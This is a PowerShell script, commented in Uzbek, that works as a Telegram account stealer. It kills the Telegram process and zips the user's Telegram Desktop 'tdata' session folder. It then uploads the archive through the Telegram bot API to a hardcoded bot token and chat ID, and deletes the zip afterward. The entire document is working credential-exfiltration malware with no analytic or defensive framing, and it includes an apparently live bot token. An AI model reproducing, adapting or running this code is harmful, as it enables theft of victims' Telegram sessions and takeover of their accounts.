# --- SOZLAMALAR ---
$token = 8649684929:AAGUPmSFkh3tLV6OkveTTX3nuIc4rCNjs_A
$chatId = 7068280080
# ------------------

$username = $env:USERNAME
$tdata_path = "$env:APPDATA\Telegram Desktop\tdata"
$zip_path = "$env:TEMP\tdata_$username.zip"

# Telegram yopiq bo'lishini tekshirish (band bo'lsa nusxa ololmaydi)
Stop-Process -Name "Telegram" -Force -ErrorAction SilentlyContinue

if (Test-Path $tdata_path) {
    try {
        # Papkani ZIP qilish
        Add-Type -A System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tdata_path, $zip_path)
        
        # Faylni Telegram botga yuborish
        $send_url = "https://api.telegram.org/bot$token/sendDocument"
        $file_item = Get-Item $zip_path
        $post_data = @{
            chat_id = $chatId
            document = $file_item
            caption = "Muvaffaqiyatli! User: $username"
        }
        
        Invoke-RestMethod -Uri $send_url -Method Post -Form $post_data
        
        # Yuborilgandan keyin vaqtinchalik ZIPni o'chirish
        Remove-Item $zip_path -Force
    } catch {
        Write-Host "Xatolik yuz berdi: $_"
    }
} else {
    Write-Host "tdata papkasi topilmadi!"
}
